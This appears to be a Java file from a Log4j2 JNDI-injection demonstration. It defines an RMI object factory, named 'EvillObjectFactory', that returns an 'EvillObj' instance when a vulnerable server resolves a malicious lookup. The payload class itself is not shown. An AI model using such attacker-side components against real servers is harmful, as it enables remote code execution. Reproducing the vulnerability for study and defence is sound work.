package com.itpkm.springmvclog4j2.rmi;

import javax.naming.Context;
import javax.naming.Name;
import java.util.Hashtable;

/**
 * RMI Object Factory
 *
 * @author itpkm
 * @date 2021年12月14日
 */
public class EvillObjectFactory implements javax.naming.spi.ObjectFactory {
    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        return new EvillObj();
    }
}
